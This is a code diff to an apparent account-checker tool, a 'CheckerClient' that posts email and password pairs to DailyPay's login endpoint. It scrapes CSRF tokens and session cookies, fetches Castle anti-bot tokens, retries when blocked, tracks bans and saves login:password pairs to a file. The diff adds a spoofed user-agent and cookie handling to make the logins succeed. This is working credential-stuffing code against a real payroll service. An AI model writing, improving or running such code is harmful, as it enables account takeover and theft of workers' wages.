@@ -121,18 +121,20 @@ class CheckerClient:
 			(castle_token, csrf, success, last_error) = None, None, False, 'None'
 			for idx in range(3):
 				castle_token, user_agent = await self.get_castle_token()
+				user_agent = 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko'
 				headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://app.dailypay.com', 'priority': 'u=0, i', 'referer': 'https://app.dailypay.com/login_password', 'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="112", "Google Chrome";v="112"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent}
 				try:
 					req = await self.loop.run_in_executor(None, functools.partial(session.get,
 																				  'https://app.dailypay.com/login_password',
 																				  headers=headers, timeout_seconds=5))
+					cookie = str(req.headers['Set-Cookie']).split('_dailypay_session=')[1].split(';')[0]
 					csrf = req.text.split('meta name="csrf-token" content="')[1].split('"')[0]
-
 					data = {"authenticity_token": csrf, "session[email]": login, "session[password]": password, "commit": "Continue", "castle_request_token": castle_token}
 					req = await self.loop.run_in_executor(None,
 														  functools.partial(session.post, 'https://app.dailypay.com/sessions',
-																			data=data, headers=headers, allow_redirects=True,
+																			cookies={'_dailypay_session': cookie}, data=data, headers=headers, allow_redirects=True,
 																			timeout_seconds=10))
+					print(req)
 					if req.status_code == 403: continue
 					success = True
 					break
@@ -200,7 +202,7 @@ class CheckerClient:
 				await write_to_file(accounts_path, f'{login}:{password}\n')
 				update_stats('errors', 1)
 				return False
-			update_stats('bans', 1, True)
+			update_stats('bans', 1)
 			return await self.account_login(login, password, True)
 		except httpx.ConnectError:
 			await write_to_file(accounts_path, f'{login}:{password}\n')
@@ -216,7 +218,7 @@ class CheckerClient:
 				await write_to_file(accounts_path, f'{login}:{password}\n')
 				update_stats('errors', 1)
 				return False
-			update_stats('bans', 1, True)
+			update_stats('bans', 1)
 			return await self.account_login(login, password, True)
 		except Exception as e:
 			await write_to_file(accounts_path, f'{login}:{password}\n')
